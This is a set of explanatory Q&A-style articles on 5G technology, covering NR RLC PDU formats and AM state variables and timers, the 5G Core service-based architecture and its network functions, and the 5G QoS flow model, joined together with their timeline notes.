Otherwise , the SDU should be segmented , with RLC maximizing the segment size given the grant .
What 's the format of a TMD PDU ?
TMD PDU format .
Source : ETSI 2021a , fig .
6.2.2.2 - 1 .
A TM RLC entity sends and receives data using the TM Data ( TMD ) PDU format .
Since no RLC header is used by TM RLC entity , and no segmentation is done , the RLC SDU becomes an RLC PDU .
This is the most trivial of all RLC PDU formats .
Could you describe header fields common to UMD and AMD RLC PDUs ?
Segmentation is one of the essential features of UM and AM RLC entities .
The following header fields assist the receiving RLC entity to reassemble a complete SDU from its segments : Segmentation Info ( SI ) : Indicates if the PDU contains a complete SDU or first / last / middle segment .
The length is 2 bits .
Segment Offset ( SO ) : Indicates the position of the current segment in bytes within the original RLC SDU .
Numbering starts from zero .
The length is 16 bits .
Sequence Number ( SN ) : Indicates the sequence number of the corresponding SDU .
Note that numbering is for SDUs , not for their segments .
The length is configured by RRC : 6 or 12 bits for UMD PDU , and 12 or 18 bits for AMD PDU .
What 's the format of an UMD PDU ?
UMD PDU formats .
Source : Adapted from ETSI 2021a , sec .
6.2.2.3 .
A UM RLC entity sends and receives data using UM Data ( UMD ) PDU formats .
UMD PDU has five formats : containing a complete SDU without SN ; containing 6-bit or 12-bit SN with or without SO .
For groupcast and broadcast on sidelink channels , 6-bit SN is used .
SN is included only if an RLC SDU is segmented .
UMD PDU carrying the first segment does n't include the SO field .
When an RLC SDU is not segmented , SN is not incremented .
This makes sense since an RLC PDU carrying a complete SDU does n't include SN .
What 's the format of an AMD PDU ?
AMD PDU formats .
Source : Adapted from ETSI 2021a , sec .
6.2.2.4 .
An AM RLC entity sends and receives data using AM Data ( AMD ) PDU formats .
AMD PDU has four formats : containing 12-bit or 18-bit SN with or without SO .
Similar to UMD PDU , the AMD PDU header includes SI , SN and SO .
Additional fields for AMD PDU are : Data / Control ( D / C ) : 1-bit field .
0 indicates control PDU and 1 indicates data PDU .
This is necessary since an AM RLC entity has both data and control PDUs .
Polling ( P ) : Set by the transmitting side to 1 if requesting a STATUS report from its peer entity .
Unlike UM , AM does n't have a dedicated format for complete SDU transmission .
However , a complete SDU can still be sent in a single RLC PDU by setting ` SI=00 ` .
Even so , AMD PDU always includes SN field , which is necessary for ARQ retransmission procedure .
Like UMD PDU , AMD PDU carrying the first segment does n't include the SO field .
What 's the format of the STATUS PDU ?
STATUS PDU formats .
Source : Adapted from ETSI 2021a , sec .
6.2.2.5 .
STATUS PDU is a control PDU applicable only to AM RLC entity .
The header consists of a 1-bit Data / Control ( D / C ) field and and a 3-bit Control PDU Type ( CPT ) field .
STATUS PDU is indicated by ` D / C=0 ` and ` CPT=000 ` .
Following the header , the STATUS PDU contains ACK_SN , NACK_SN , extension bits ( E1 / E2 / E3 ) , SOstart , SOend , and NACK range .
ACK_SN and E1 are mandatory in every STATUS PDU .
Other fields are used only when there 's a need to indicate incorrectly received RLC SDUs and segments .
ACK_SN and NACK_SN are 12 or 18 bits as configured by RRC .
SOstart and SOend occupy 16 bits .
The NACK range field is 8 bits .
How are extension bits used in the STATUS PDU ?
Examples of STATUS PDUs and use of E1 / E2 / E3 bits .
Source : Devopedia 2021 .
There are a few ways to indicate missing SDUs or their segments , controlled by extension bits : E1 : ` E1=1 ` if NACK_SN / E1 / E2 / E3 fields follow .
In this context , all SDUs prior to ACK_SN except those indicated by NACK_SN have been correctly received .
` E1=0 ` implies all SDUs prior to ACK_SN have been correctly received , common if communication is going smoothly without requiring retransmissions .
E2 : ` E2=1 ` if SOstart / SOend fields follow .
Whereas E1 and NACK_SN specify a lost SDU , E2 and SOstart / SOend specify lost segments .
` SOend=0xFFFF ` is a special case to indicate that all bytes from SOstart are lost .
E3 : ` E3=1 ` if NACK range field follows .
This is the number of consecutive RLC SDUs lost from and including NACK_SN .
This is useful when handling burst errors .
E3 can be used together with E2 , that is , to inform loss from SOstart of NACK_SN to SOend of NACK_SN+NACK range-1 .
The special value ` SOend=0xFFFF ` is applicable .
In the figure , we illustrate a few loss scenarios and their corresponding STATUS PDUs .
We do n't show retransmissions or re - segmentation .
We assume 12-bit SN and 1024-byte SDUs segmented equally into four 256-byte segments .
An early draft of 5 G NR RLC specification TS 38.322 was released .
This will evolve to version 1.0.0 by September .
3GPP publishes Release 15 " early drop " .
RLC specification TS 38.322 is updated to version 15.0.0 .
This version includes header fields SI , SN , SO , D / C and P for data PDUs ; header fields D / C and CPT for STATUS PDU ; data fields ACK_SN , NACK_SN , SOstart , SOend , NACK range , E1 , E2 and E3 for STATUS PDU .
3GPP publishes Release 16 specifications .
The RLC specification is TS 38.322 version 16.1.0 .
From Release 15 , there are no changes to RLC PDU formats .
In 5 G NR , an RLC AM entity is bidirectional .
The transmitting side of an entity communicates with its peer entity 's receiving side .
The transmitting side sends data to PDUs while the receiving side acknowledges the transmission via control PDUs .
An AM Data ( AMD ) PDU always includes an RLC header , which in turn contains the Sequence Number ( SN ) of the RLC SDU .
SDUs may be segmented .
SN and Segment Offset ( SO ) are essential header fields that help with acknowledgements and retransmissions .
STATUS PDU is the only type of control PDU and it too has a header .
Behaviour is controlled by state variables , constants and timers .
Compared to the other two RLC transmission modes ( TM and UM ) , AM is more complex .
How does an AM RLC entity operate ?
Model of AM RLC entity .
Source : ETSI 2021a , fig .
4.2.1.3.1 - 1 .
The transmitting side receives RLC SDU from the upper layer .
It assigns the next available SN to this SDU .
It sends an RLC header plus RLC SDU to the MAC .
If the entire SDU ca n't be sent in a single transmission , it 's segmented .
Header plus the largest possible segment are given to MAC .
The receiving side acknowledged via ACK_SN ( good SDUs ) and NACK_SN ( lost SDUs or segments ) .
If all segments of an SDU are correctly received , it forwards the RLC SDU to the upper layer .
Order of delivery is not important for RLC .
The Transmitting side retransmits SDUs or segments previously lost .
While retransmitting , it may re - segment lost portions of the SDU .
RLC is permitted a maximum number of retransmissions , after which the error is indicated to the upper layer .
For flow control , both sides obey the window size , which depends on the SN bit length : 2048 ( 12-bit SN ) or 131072 ( 18-bit SN ) .
Via polling , the transmitting side can request its peer to send current status .
The receiving side has a timer for regular status transmissions .
Likewise , the transmitting side has a timer to regulate polling .
Could you explain the state variables used by an AM RLC entity on the transmitting side ?
The following state variables exist on the transmitting side of AM RLC : TX_Next : Send state variable .
Initialized to 0 .
Assigned as SN to the next RLC SDU received from the upper layer ; and then incremented .
TX_Next_Ack : Determines lower edge of the transmit window .
It 's the SN of the next in - sequence SDU that needs to be positively acknowledged .
Initialized to 0 .
Updated when there 's positive acknowledgment for SDU with SN = TX_Next_Ack .
It 's obvious that TX_Next_Ack & leq ; TX_Next .
POLL_SN : Highest SN among all PDUs submitted to the lower layer at the time of polling .
Initialized to 0 .
Could you explain the counters used by an AM RLC entity on the transmitting side ?
The following counters exist on the transmitting side of AM RLC : PDU_WITHOUT_POLL : Number of PDUs sent since the most recent poll .
Initialized to 0 .
BYTE_WITHOUT_POLL : Number of bytes sent since the most recent poll .
Initialized to 0 .
RETX_COUNT : Number of retransmissions of an SDU or its segment .
One counter per RLC SDU .
Relevant to the counters are three parameters that RRC configures : ` maxRetxThreshold ` : Limits the number of retransmissions .
When RETX_COUNT reaches this limit , upper layers are indicated of SDU transmission failure .
This may lead to an RRC Re - establishment procedure .
` pollPDU ` : When PDU_WITHOUT_POLL reaches or exceeds this value , polling is triggered .
` pollByte ` : When BYTE_WITHOUT_POLL reaches or exceeds this value , polling is triggered .
Could you explain the state variables used by an AM RLC entity on the receiving side ?
The following state variables exist on the receiving side of AM RLC : RX_Next : Determines the lower edge of the receive window .
Initialized to 0 .
Updated when an SDU with SN = RX_Next is fully received .
RX_Next_Highest : Contains the next SN following the highest SN of all received SDUs , even if the highest - SN SDU is not fully received .
Thus , RX_Next & leq ; RX_Next_Highest .
Initialized to 0 .
RX_Highest_Status : Highest possible value to be indicated in ACK_SN field of STATUS PDU .
SDUs with lower SN that have n't been fully received will be indicated with NACK_SN in the STATUS PDU .
Initialized to 0 .
RX_Next_Status_Trigger : SN following the SN of the RLC SDU that triggered t - Reassembly .
Thus , if SN=2 is partially received and t - Reassembly is started for it , this variable is set to 3 .
Could you illustrate the update of RLC AM receiving side state variables ?
Illustrating update of RLC AM receiving side state variables in four scenarios .
Source : Devopedia 2021 .
This example is based on RLC specification TS 38.322 .
It 's accompanied by code in the Sample Code section of this article .
We present three scenarios .
They all start with SN=0 fully received , then SN=1 and SN=2 partially received .
When SN=1 is partially received , t - Reassembly is started .
When SN=2 is partially received , there 's no action on the timer since it 's already running for SN=1 .
In scenario ( a ) , SN=1 is fully received .
Thus , t - Reassembly is stopped and reset .
However , since SN=2 was partially received earlier , t - Reassembly has started for SN=2 .
When SN=2 is later fully received , reassembly is completed for this SDU , and the timer is stopped and reset .
In scenario ( b ) , SN=1 is fully received and hence t - Reassembly is restarted for SN=2 .
When t - Reassembly expires ( could not reassemble SN=2 soon enough ) , status reporting is triggered .
STATUS PDU will include NACK for SN=2 .
In scenario ( c ) , SN=3 is partially received .
When t - Reassembly expires ( could not reassemble SN=1 soon enough ) , status reporting is triggered .
STATUS PDU will include NACK for SN=1 and SN=2 , and possibly for SN=3 .
Could you explain the timers used by an RLC AM entity ?
Triggering and sending STATUS PDU .
Source : Adapted from EventHelix 2019 .
An RLC AM entity maintains three timers : t - PollRetransmit : At the transmitting side .
Started or restarted when the poll bit is set in an AMD PDU .
Stopped when STATUS PDU is received indicating ACK / NACK for POLL_SN , which is the highest SN transmitted at the time of the last poll .
At expiry , initiate data retransmissions and poll retransmission .
t - Reassembly : On the receiving side .
Detects loss of RLC PDUs .
It started when a segment was received but more segments are pending for that SDU .
Stopped when SDU is completely received .
At expiry , it triggers status reporting .
t - StatusProhibit : On the receiving side .
Prohibits frequent transmissions of STATUS PDU .
It started when a STATUS PDU was sent .
The Expiry of t - Reassembly triggers a status report but STATUS PDU is sent only when t - StatusProhibit expires .
Status reporting is triggered either by polling ( transmitting side initiated ) or t - Reassembly expiry ( receiving side initiated ) .
At most , only one of each of the above timers can be run in an AM RLC entity .
An early draft of 5 G NR RLC specification TS 38.322 was released .
This will evolve to version 1.0.0 by September .
3GPP publishes Release 15 " early drop " .
RLC specification TS 38.322 is updated to version 15.0.0 .
The setting of POLL_SN is corrected in the specification .
3GPP publishes Release 16 specifications .
The RLC specification is TS 38.322 version 16.1.0 .
5 G Core SBA along with IMS Core and MEC System .
Source : Ivezic 2020 .
Cellular core networks till LTE used specialized telecom protocols running on specialized telecom hardware .
With LTE vEPC , the first efforts were made towards virtualization .
Service - Based Architecture ( SBA ) is an evolution of this approach and it 's been adopted by the 5 G System .
In SBA , a set of Network Functions ( NFs ) provide services to other authorized NFs .
These NFs are nothing more than software implementations running on commercial off - the - shelf hardware , possibly in the cloud .
A NF can offer one or more services .
NFs are interfaced via well - defined APIs and a client - server model .
Traditional telecom signalling messages are replaced with API calls on a logically shared service bus .
SBA utilizes the maturity of web and cloud technologies .
Modularity , scalability , reliability , cost - effective operation , easy deployments , and faster innovation are some of the benefits of moving to SBA .
Why does the 5 G Core need a service - based architecture ?
What operators want from 5 G Core .
Source : Cisco 2018 , pp .
4 .
5 G is not just about new devices , new use cases and higher speeds .
The core network needs to be modernized to be able to support demanding performance requirements .
eMBB , mMTC and URLLC are all different use cases that ca n't be satisfied by monolithic architecture .
We 're expecting a massive increase in high - bandwidth content , low - latency applications and huge volumes of small data packets from IoT sensors .
The 5 G Core needs to be flexible , agile and scalable .
User plane and control plane need to be scaled independently .
Traffic handling must be optimized .
Network operators must be able to quickly launch new services .
This calls for virtualization , a software - driven approach and adopting web protocols and cloud technologies .
The network must be composed of loosely coupled network functions that can be managed independently but interfaced efficiently via mature and scalable technologies .
To reduce both CAPEX and OPEX , there 's a need to use off - the - shelf hardware running multi - vendor software exposing open interfaces .
Operators must have the flexibility to use private or public clouds .
Compute and storage should be distributed .
There 's a need to support edge computing .
What are the benefits of moving to 5 G SBA ?
Evolving from dedicated hardware to cloud native architecture .
Source : Samsung 2020 , fig .
1 - 1 .
Since NFs are loosely coupled and interfaced with APIs , each NF can be evolved and deployed independently .
SBA signifies a move from monolithic to modular architecture .
New NFs can be rolled out without impacting existing ones .
Via NEF , external applications can interwork with 5 G Core .
Across the 5 G ecosystem , this enables faster innovation .
SBA brings scalability and resilience .
Rather than adding physical nodes that may take weeks , new instances of NFs can be created / destroyed dynamically in minutes .
If an instance or a physical node fails , monitoring systems can detect this and quickly spin up new instances .
SBA 's modular design enables network slicing .
Multiple logical networks can run on a single physical network , thus catering to multiple industry verticals .
In terms of true business value , Oracle has noted that SBAs provide a set of loosely coupled services that empower communications service providers ( CSPs ) to be more agile and enable rapid service delivery .
What web technologies are enabling 5 G SBA ?
5 G Core procedures run on top of web technologies .
Source : Schröder 2018 , slide 14 .
Telecom protocols common in earlier generations have been replaced in 5 G Core with web technologies .
SCCP , TCAP , SCTP and Diameter are some examples that have been replaced with TCP / IP for networking , HTTP/2 at the web application layer and JSON as the data serialization format .
For security , TLS is used above the TCP layer .
Network functions in SBA are exposed via well - defined Service - Based Interfaces ( SBIs ) .
The bottom - up layering of L2 , IP , TCP , TLS , HTTP/2 and application layers is formally called the SBI protocol stack .
The interfaces themselves are defined with an Interface Definition Language ( IDL ) called OpenAPI Specification .
Interfaces are exposed as RESTful APIs .
5 G SBA has adopted the web 's client - server model , but a client is called Service Consumer and a server is called Service Provider .
Many cloud native tools and technologies are enabling 5 G SBA : Docker for containerization , Kubernetes for container orchestration , Istio for service mesh , Prometheus for monitoring , Grafana for visualization , and many more .
Could you describe the architecture of 5 G SBA ?
5 G SBA in reference point and service - based representations .
Source : Wilke 2017 , slide 10 .
5 G SBA is described by a reference point representation that names the points by which each NF connects to other NFs .
In practice , the reference points are implemented by corresponding NF Service - Based Interfaces ( SBIs ) .
Instead of point - to - point connections , NFs interconnect on a logically shared infrastructure or service bus .
For instance , AMF and SMF are connected via the N11 reference point for which the corresponding SBIs are Namf and Nsmf .
SBIs are defined only for the control plane .
Thus , the reference point between SMF and UPF is N4 .
It has no equivalent to SBI .
Likewise , SBIs are defined for 5 G Core functionality .
Thus , reference points N1 , N2 and N3 that involve the UE or RAN do n't have SBIs .
Which are the main functions in 5 G SBA ?
Network functions in 5 G SBA are mapped to their equivalent functions in LTE .
Source : Kaur 2019 .
5 G Core has about two dozen network functions : Access and Mobility Management Function ( AMF ) , Application Function ( AF ) , Authentication Server Function ( AUSF ) , Binding Support Function ( BSF ) , CHarging Function ( CHF ) , Network Data Analytics Function ( NWDAF ) , Network Exposure Function ( NEF ) , Network Repository Function ( NRF ) , Network Slice Selection Function ( NSSF ) , Network Slice Specific Authentication and Authorization Function ( NSSAAF ) , Policy Control Function ( PCF ) , Session Management Function ( SMF ) , UE radio Capability Management Function ( UCMF ) and Unstructured Data Storage Function ( UDSF ) , Unified Data Repository ( UDR ) , User Plane Function ( UPF ) and Unified Data Management ( UDM ) .
Among the network entities are Service Communication Proxy ( SCP ) and Security Edge Protection Proxy ( SEPP ) .
For interworking with non-3GPP access networks , we have Non-3GPP InterWorking Function ( N3IWF ) , Trusted Non-3GPP Gateway Function ( TNGF ) , Wireline Access Gateway Function ( W - AGF ) and Trusted WLAN Interworking Function ( TWIF ) .
For location services , NFs include Location Management Function ( LMF ) , Location Retrieval Function ( LRF ) and Gateway Mobile Location Centre ( GMLC ) .
Could you describe some of the network functions in 5 G SBA ?
5 G SBA architecture in Release 15 .
Source : Cisco 2018 , pp .
7 .
We note a few of Release 15 NFs : AMF : Registration , access control and mobility management .
SMF : Creates , updates and removes PDU sessions .
Manages session context with UPF .
UE IP addresses allocation and DHCP role .
UPF : User plane packet forwarding and routing .
Anchor point for mobility .
NRF : Maintains updated records of services provided by other NFs .
NEF : Securely opens up the network to third - party applications .
AUSF : Authentication for 3GPP access and untrusted non-3GPP access .
PCF : Unified policy framework to govern network behaviour .
It provides policy rules for controlling planes .
NSSF : Selects network slice instances for the UE .
Determines AMF is set to serve the UE .
UDM : Generates AKA authentication credentials .
Authorizes access based on subscription data .
AF : Interfaces with 3GPP core network for traffic routing preferences , NEF access , policy framework interactions and IMS interactions .
BSF : Binds an AF request to the relevant PCF .
Could you describe an example of how services communicate on 5 G SBA ?
A Simplified API calls , for example , SBA procedures .
Source : Mayer 2018 , fig .
3 .
A service producer will register itself with the Network Repository Function ( NRF ) .
A service consumer will consult the NRF to discover available NF instances .
Thus , the process involves Service Registration and Service Discovery .
Once so discovered , the service consumer can directly consume authorized APIs exposed by the service producer .
These API calls are RESTful : client - server model , stateless calls , unique URIs , and use of HTTP verbs GET / POST / PUT / PATCH / DELETE .
Indirect communication is also possible via Service Communication Proxy ( SCP ) .
Service registration and discovery still happen with the NRF but this may be delegated to the SCP .
Consumers send their requests through the SCP .
The SCP itself does n't expose any network function .
Finally , it 's possible to configure consumers with NF profiles of producers .
This bypasses service registration and discovery .
In fact , the specification identifies this as Model A. Model B is direct communication .
Model C and Model D are indirect communications .
All NF services are detailed in TS 23.502 specification .
Services within an NF can call one another but their interactions are not specified in Release 16 .
What are the challenges with 5 G SBA ?
Security is one of the big challenges with many possible vulnerabilities .
JSON is the exact opposite of the telecomworld'sASN.1.
JSON specification is less rigorous and has versioning problems .
Implementing and deploying OAuth 2.0 is going to be complex .
The web 's practice of rapid changes and CI / CD pipelines can make telecom systems less secure .
REST APIs have many known vulnerabilities .
There are also problems with TLS .
Architecture , frameworks , libraries and tools need greater maturity .
Cloud - native architecture was developed for enterprise clouds , not for telecom systems that need low downtime of a few minutes per year .
Kubernetes lack networking features such as ECMP , GTP tunnelling , SCTP and LACP .
In a distributed environment involving hundreds of nodes , deploying and operating OpenStack and Kubernetes for NFVI and MANO is not trivial .
Complexity increases when extensions such as DPDK are included .
Traditional network visibility tools must evolve to monitor at the container level .
With NFs being developed by many vendors , integration and interoperability may become an issue .
LTE EPCs and 5 G Core need to interoperate as well and should n't be managed in silos .
Legacy OAM tools for 4 G that ca n't handle 5 G Core may lead to inefficient operations .
This is the decade when Service - Oriented Architecture ( SOA ) starts to gain wider adoption .
Applications are not monoliths but composed of isolated and independent services .
Services are loosely bound together by a standard communications framework .
In this decade , Web Services , a web - based implementation of SOA , has become popular over proprietary methods such as CORBA or DCOM .
Many web and cloud technologies have developed and become popular in the 2010s : the term microservices has been coined ( 2011 ) ; REST and JSON have become the de facto standard for consuming backend data ( 2012 ) ; Docker for containerization is open source ( 2013 ) ; and Google open sources Kubernetes , a container orchestration system .
These developments will soon enable the birth of 5 G 's service - based architecture .
At Mobile World Congress , Virtual Evolved Packet Core ( vEPC ) solutions were showcased by NEC , Cisco and Intel .
In October , NEC claimed to be the world 's first to offer a vEPC solution on commercial off - the - shelf ( COTS ) hardware based on Intel architecture .
Deployment of vEPC solutions gathers pace and adoption through 2014 .
By 2015 , operators will see the value in virtualization of the core network .
Comparing SOA , microservices , SBA and monolithic architecture .
Source : 5G - PPP 2018 , table 1 .
At the ÜberConf 2016 conference , Ford and Richards delivered presentations on service - based architecture .
SOA breaks applications by layers but microservices break them by domain .
They note that moving from a monolithic application to microservices is not a trivial exercise .
SBA offers a middle ground with dozens of services rather than hundreds of microservices .
Services in SBA may even share a common data storage .
3GPP publishes version 0.0.0 of TS 23.501 : System architecture for the 5 G System .
In the future , this is the main document that will detail 5 G Core 's service - based architecture .
This evolve to version 1.0.0 by June .
3GPP publishes Release 15 " early drop " .
In TS 23.501 , this release includes network functions and entities AUSF , AMF , UDSF , NEF , NRF , NSSF , PCF , SMF , UDM , UDR , UPF , AF , 5G - EIR and SEPP .
BSF is also included in this release .
In an interview , we come to learn that 3GPP Core Networks and Terminals ( CT ) Working Groups are interfacing with IETF on how to adopt QUIC .
As a replacement for the TCP / IP stack in the 5 G Core , QUIC may be considered .
As of Release 16 ( July 2020 ) , QUIC is n't part of the 5 G Core .
Towards supporting Location Services ( LCS ) , relevant network functions are defined in TS 23.273 , version 16.0.0 .
These include the Gateway Mobile Location Centre ( GMLC ) , Location Retrieval Function ( LRF ) and Location Management Function ( LMF ) .
3GPP publishes Release 16 specifications .
New capabilities are NEF - based infrequent small data transfer via NAS , which will benefit MTC use cases and IoT applications ; indirect communication between network services via Service Communication Proxy ( SCP ) and implicit discovery ; support of trusted non-3GPP access ; NF Set and NF Service Set ; and more .
New NFs include UCMF , NWDAF , CHF , N3IWF , TNGF , W - AGF .
A study involving service providers who operator 30 % of the world 's commercial 5 G networks shows that Unified Data Management ( UDM ) is the most tested and deployed network function .
This comes from the realization that data is the new gold .
Operators wish to control and monetize it .
Overview of QoS in 5 G System .
Source : Netmanias 2019 .
The 5 G Quality of Service ( QoS ) model is based on QoS Flows .
Each QoS flow has a unique identifier called QoS Flow Identifier ( QFI ) .
There are two types of flows : Guaranteed Bit Rate ( GBR ) QoS Flows and Non - GBR QoS Flows .
The QoS Flow is the finest granularity of QoS differentiation in the PDU Session .
User Plane ( UP ) traffic with the same QFI receives the same forwarding treatment .
At the Non - Access Stratum ( NAS ) , packet filters in UE and 5GC map UL and DL packets respectively to QoS flows .
At the Access Stratum ( AS ) , rules in UE and Access Network ( AN ) map QoS flows to Data Radio Bearers ( DRBs ) .
Every QoS flow has a QoS profile that includes QoS parameters and QoS characteristics .
Applicable parameters depend on GBR or non - GBR flow type .
QoS characteristics are standardized or dynamically configured .
Could you explain 5 G QoS with an example ?
Example of QoS realization for downlink packets .
Source : Rodini 2017 , slide 6 .
Consider multiple PDU sessions , each of which could generate packets of different QoS requirements .
For example , packets from the Internet may be due to users browsing a website , streaming a video or downloading a large file from an FTP server .
Delay and jitter are important for video but less important for FTP download .
Between the User Equipment ( UE ) and the Data Network ( DN ) , PDU sessions and Service Data Flows ( SDFs ) are set up .
Each application gets its own SDF .
For example , we may say that the Internet , Netflix and IMS are PDU sessions .
The Internet PDU session has four SDFs and the IMS PDU session has two SDFs .
Multiple IP flows can be mapped to the same QoS flow .
QoS flow 2 is an example that carries both WhatsApp video and Skype video .
On the radio interface , QoS flows are mapped to data radio bearers ( DRBs ) that are configured to deliver that QoS. Multiple QoS flows can be mapped to a single DRB .
DRB2 is an example and it carries QoS flows 2 and 3 .
How does the QoS model differ between LTE and 5 G networks ?
Comparing QoS models of 4G / LTE and 5G. Source : E.DR_91 2019 .
In 4G / LTE , QoS is applied at the level of Evolved Packet Service ( EPS ) bearer .
There 's a one - to - one mapping , which really means that for an EPS bearer there 's a corresponding EPS Radio Access Bearer ( RAB ) , an S1 bearer and a Radio Bearer ( RB ) .
5 G provides a more flexible QoS model with QoS Flow being the finest granularity at which QoS is applied .
The abstraction of QoS flow allows us to decouple the roles of 5 G Core and NG - RAN .
SMF in the 5 G Core configures how packets ought to be mapped to QoS flows .
AN independently decides how to map QoS flows to radio bearers .
This is a flexible design since gNB can choose to map multiple QoS flows to a single RB if such an RB can be configured to fulfil the requirements of those QoS flows .
The figure shows an example in which QoS flow 1 goes on DRB1 ; QoS flows 2 and 3 go on DRB2 .
To summarize , 4 G QoS is at the EPS bearer level and 5 G QoS is at the QoS flow level .
Could you describe the end - to - end QoS for a PDU session ?
Packet classification , user plane marking and mapping to radio resources .
Source : ETSI 2021a , fig .
5.7.1.5 - 1 .
Application packets are classified or mapped to suitable QoS flows by the UPF in DL and UE in UL .
UPF uses Packet Detection Rules ( PDRs ) .
UE uses QoS rules .
Because multiple PDRs and rules can exist , these are evaluated in precedence order , from lowest to highest values .
If no match is found , the packet is discarded .
On the N3 interface between UPF and AN , packets are marked with QFI in an encapsulation header .
Due to this marking , AN knows which packets belong to which QoS flow .
The SDAP sublayer in the AN maps the flows to suitable DRBs .
At the receiving end , UE 's SDAP sublayer does the reverse mapping from DRBs to QoS flows .
A similar flow happens for UL packets .
UE marks the packet with QFI in the SDAP header .
AN does QFI marking in an encapsulation header on N3 .
UPF verifies if a received QFI is aligned with configured QoS rules or Reflective QoS. What 's the basis for classifying packets into QoS flows ?
In the downlink , UPF uses Packet Detection Rules ( PDRs ) .
In the uplink , UE uses QoS rules .
Both these make use of a Packet Filter Set that has one or more packet filters .
An IP Packet Filter Set is based on a combination of fields : Source / destination IP address or IPv6 prefix ; Source / destination port number ( could be a port range ) ; Protocol ID of the protocol above IP / Next header type ; Type of Service ( TOS ) ( IPv4 ) or Traffic class ( IPv6 ) and Mask ; Flow Label ( IPv6 ) ; Security parameter index ; and Packet Filter direction .
An Ethernet Packet Filter Set is based on a combination of fields : Source / destination MAC address ( may be a range ) ; Ethertype as defined in IEEE 802.3 ; Customer - VLAN tag ( C - TAG ) and/or Service - VLAN tag ( S - TAG ) VID fields as defined in IEEE Std 802.1Q ; Customer - VLAN tag ( C - TAG ) and/or Service - VLAN tag ( S - TAG ) PCP / DEI fields as defined in IEEE Std 802.1Q ; IP Packet Filter Set , in the case that Ethertype indicates IPv4 / IPv6 payload ; and Packet Filter direction .
What are the defaults used in the 5 G QoS model ?
The specification defines a default QoS rule .
Every PDU session is required to have a QoS flow associated with such a default .
This flow remains active for the lifetime of the PDU session .
This is a Non - GBR QoS Flow to facilitate EPS interworking .
For IP and Ethernet sessions , the default QoS rule is the only rule with a Packet Filter Set that allows all UL packets , and it has the highest precedence .
Note that QoS rules and PDRs are evaluated in increasing order of precedence values .
Reflective QoS is not applied and RQA is not sent to a QoS flow that uses default QoS flow .
QoS parameters too have defaults .
On a per - session basis , SMF obtains from the UDM subscribed Session - AMBR , and subscribed defaults for Non - GBR 5QI , ARP and optionally 5QI Priority Level .
Based on interaction with PCF , SMF may change subscribed values .
What 's the role of SMF within the QoS model ?
SMF configures QoS information to UE , gNB and UPF .
Source : Cheung 2020 .
QoS flows are controlled by SMF .
They 're preconfigured or created / updated via PDU Session Establishment or Modification procedures .
SMF interacts with UDM and PCF to obtain subscribed and authorized QoS parameters for each QoS flow .
PCF responds with Policy Charging and Control ( PCC ) Rules that include the Packet Filter Set .
SMF extracts QoS Flow Binding Parameters ( 5QI , ARP , Priority , MDBV , Notification Control ) and creates a new QoS flow if one does n't exist for this combination .
The binding of PCC rules to QoS Flows is an essential role of SMF .
SMF associates a QoS flow with QoS profile , QoS rules and PDRs .
PDRs are derived from the PCC rule and inherit the precedence value .
PDRs are part of the SDF Template passed to UPF .
SMF sends QoS profile to AN via AMF over N2 , QoS rules to the UE via AMF over N1 , and PDRs to the UPF over N4 .
SMF assigns a QFI for each QoS flow and an identifier to each QoS rule .
Both identifiers are unique within the PDU session .
What is meant by Reflective QoS ?
For UL packet classification , SMF provides QoS rules to the UE .
Or the UE implicitly derives the rules from downlink packets .
This latter case is called Reflective QoS. Both reflective and non - reflective QoS can coexist within the same PDU session .
Reflective QoS applies to IP PDU session and Ethernet PDU session .
UE indicates to SMF if it supports Reflective QoS during PDU Session Establishment .
UE may change its support and indicate this via PDU Session Modification .
UE - derived QoS rules would include UL packet filter , QFI and precedence value .
Reflective QoS is controlled per packet .
SMF signals the use of Reflective QoS Indication ( RQI ) marking to UPF .
SMF signals Reflective QoS Attribute ( RQA ) to the AN via the N2 interface .
Subsequently , UPF includes RQI for every DL packet of an SDF that uses Reflective QoS. AN indicates the RQI to the UE .
When UE receives a DL packet with RQI , it creates or updates the QoS rule for UL traffic .
It also starts the Reflective QoS Timer .
There 's one timer per UE - derived rule .
The timer is restarted when a matching DL packet is received .
The rule is discarded when the timer expires .
Which are the 5 G QoS parameters ?
Applicability of QoS parameters across resource types .
Source : Mataj 2020 , table 5.1 .
We note the following : 5 G QoS Identifier ( 5QI ) : An identifier for QoS characteristics that influence scheduling weights , admission thresholds , queue management thresholds , link layer protocol configuration , etc .
Allocation and Retention Priority ( ARP ) : Information about priority level , pre - emption capability ( can pre - empt resources assigned to other QoS flows ) and the pre - emption vulnerability ( can be pre - empted by other QoS flows ) .
Reflective QoS Attribute ( RQA ) : Optional parameter .
Certain traffic on this flow may use reflective QoS. Guaranteed Flow Bit Rate ( GFBR ) : Measured over the Averaging Time Window .
Recommended to be the lowest at which the service will survive .
Maximum Flow Bit Rate ( MFBR ) : Limits bitrate to the highest expected by this QoS flow .
Aggregate Maximum Bit Rate ( AMBR ) : Session - AMBR is per PDU session across all its QoS flows .
UE - AMBR is for each UE .
QoS Notification Control ( QNC ) : Configures NG - RAN to notify SMF if GFBR ca n't be met .
Useful if the application can adapt to changing conditions .
If alternative QoS profiles are configured , NG - RAN indicates if one of these matches currently fulfils performance metrics .
Maximum Packet Loss Rate : In Release 16 , this is limited to voice media .
Could you describe some standardized 5QI values and their QoS characteristics ?
An extract of some 5QI values and their QoS characteristics .
Source : Adapted from ETSI 2021a , table 5.7.4 - 1 .
Specification TS 23.501 defines some 5QI values that translate to QoS characteristics commonly used .
This leads to optimized signalling , that is , specifying the 5QI value is sufficient , though default values can be modified .
For non - standard 5QI values , QoS characteristics need to be signalled as part of the QoS profile .
SMF signals QoS profiles to NG - RAN via AMF .
QoS characteristics in these profiles are in fact guidelines for the NG - RAN to configure suitable RBs to carry QoS flows .
There are about two dozen standard 5QI values , grouped into three resource types : Guaranteed Bit Rate ( GBR ) , Non - GBR , Delay - critical GBR .
QoS characteristics include resource type , priority level ( lower number implies higher priority ) , Packet Delay Budget ( PDB ) , Packet Error Rate ( PER ) , averaging window ( for GBR and delay - critical GBR only ) , and Maximum Data Burst Volume ( MDBV ) ( for delay - critical GBR only ) .
Conversational voice ( 5QI=1 ) has 100ms PDB and 0.01 PER .
Real - time gaming ( 5QI=3 ) has 50ms PDB and a lower priority .
IMS signalling ( 5QI=5 ) has a stringent PER of 0.000001 .
Discrete automation ( 5QI=82 ) has a stringent PDB of 10ms .
Does meeting 5 G QoS requirements imply high QoE ?
QoS and QoE for some AR use cases .
Source : Berger 2019 , slide 19 .
QoS is based on objective metrics , whereas Quality of Experience ( QoE ) is more subjective and based on actual user experience .
Thus , it 's quite possible to optimize the network to yield better KPIs for QoS without users actually noticing any difference .
